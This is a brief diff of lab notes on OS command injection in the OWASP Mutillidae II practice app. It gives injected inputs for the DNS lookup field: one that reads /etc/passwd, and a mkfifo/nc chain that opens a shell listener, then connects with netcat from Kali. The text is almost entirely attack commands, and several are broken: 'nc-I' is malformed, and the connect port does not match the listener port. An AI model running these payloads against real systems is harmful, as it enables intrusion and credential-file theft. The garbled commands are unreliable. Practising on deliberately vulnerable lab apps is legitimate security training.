@@ -1,0 +1,9 @@
+OS command injection
+Open owasp multillidae II
+Goto owasp 2013->A1 injection(others)->command injection->DNS lookup
+Enter hostname or IP as ;cat /etc/passwd
+
+Shell access
+Enter hostname or IP as www.google.com;mkfifo /tmp/pipe;sh /tmp/pipe | nc-I 4444 > /tmp/pipe
+
+Open kali terminal enter nc owasp IP 22
